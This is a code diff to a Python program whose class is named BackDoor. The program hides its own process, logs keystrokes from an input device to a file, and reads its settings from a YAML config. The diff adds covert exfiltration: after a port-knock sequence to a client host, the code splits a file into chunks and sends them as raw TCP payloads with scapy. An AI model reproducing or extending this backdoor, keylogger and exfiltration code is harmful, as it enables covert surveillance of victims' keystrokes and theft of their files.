@@ -1,7 +1,7 @@
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
 from scapy.layers.inet import UDP, IP, TCP
-from scapy.all import sniff, send
+from scapy.all import sniff, send, Raw
 from scapy.volatile import RandShort
 from subprocess import run
 import sys
@@ -15,6 +15,7 @@ from threading import Thread
 from watch import EventHandler
 from watchdog.observers import Observer
 from watchdog.events import FileSystemEventHandler
+from typing import List
 
 
 key_code_map = {
@@ -145,7 +146,7 @@ class BackDoor:
         self.sequence = []
 
 
-    def start(self):
+    def start(self) -> None:
         self.process_yaml()
         self.hide_process()
         print("Starting......")
@@ -169,13 +170,13 @@ class BackDoor:
         except FileNotFoundError as e:
             sys.exit(" Closed")
 
-    def start_keylogger(self):
+    def start_keylogger(self) -> None:
         device = InputDevice(self.device)
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         loop.run_until_complete(self.keylog(device))
 
-    async def keylog(self, device):
+    async def keylog(self, device) -> None:
         with open(self.log, 'a+') as f:
             async for event in device.async_read_loop():
                 if event.type == ecodes.EV_KEY and event.value == 1:
@@ -186,7 +187,7 @@ class BackDoor:
                         f.write(f" <Unmapped keycode: {event.code}> ")
 
 
-    def process_yaml(self):
+    def process_yaml(self) -> None:
         with open('config.yaml', 'r') as f:
             config = yaml.safe_load(f)
 
@@ -211,7 +212,7 @@ class BackDoor:
         print(f"client default is {self.client}")
         print(f"seqwuence  is {self.sequence}")
 
-    def watch_settings(self, path) -> tuple[str,str]:
+    def watch_settings(self, path) -> tuple[str, str]:
         file = path.split("/")[-1]
         directory = ""
         index = 0
@@ -222,17 +223,69 @@ class BackDoor:
         directory = path[:index]
         return directory, file
 
-    def send_file(self):
-        print(f"sending {self.path}")
+    def send_file(self) -> None:
+        """Begins the process of opening client port
+        and sending file via covert means
+        """
+        print("Knocking")
         self.port_knock()
         # Give time for client to open ports
         time.sleep(2)
+        self.prepare_msg()
 
+    def prepare_msg(self) -> None:
+        """Gets file data and sends through specified protocol"""
+        print(f"sending {self.path}")
+        binary_data = self.get_bin()
+        if self.proto == "tcp":
+            print(f"sending {self.proto}")
+            self.create_tcp(binary_data)
+        elif self.proto == "udp":
+            print(f"sending {self.proto}")
+        else:
+            print(f"sending {self.proto}")
 
-    def port_knock(self):
+    def create_tcp(self, data: List) -> None:
+        """Creates a TCP packet and embeds data in payload"""
+        print("Creating TCP packets")
+        packets = []
+        for index, byte in enumerate(data):
+            packet = IP(dst=self.client) / TCP(dport=self.send_port) / Raw(load=byte)
+            packets.append(packet)
+
+        # Add packet to specify end of file
+        packet = IP(dst=self.client) / TCP(dport=self.send_port) / Raw(load=b'\x00')
+        packets.append(packet)
+        self.send_pkt(packets)
+
+    def send_pkt(self, packets: List) -> None:
+        """Sends packets"""
+        print("Sending packets")
+        try:
+            send(packets, verbose=0)
+        except PermissionError:
+            print("Permission error! Run as sudo or admin!")
+            sys.exit()
+
+    def get_bin(self) -> List:
+        """ Separates a file into chunks of data that can be
+        sent in individual payloads
+        """
+        with open(self.path, 'rb') as f:
+            data = f.read()
+        load_size = 1024
+        binary_data = [data[i:i + load_size] for i in range(0, len(data), load_size)]
+        return binary_data
+
+    def port_knock(self)  -> None:
+        """Creates and sends sequence of packets to
+        open client port
+        """
+        packets = []
         for i in self.sequence:
             pkt = IP(dst=self.client) / TCP(dport=i, flags="S")
-            send(pkt, verbose=0)
+            packets.append(pkt)
+        self.send_pkt(packets)
 
     def craft_packet(self, msg: str):
         ip = IP(dst=self.client)
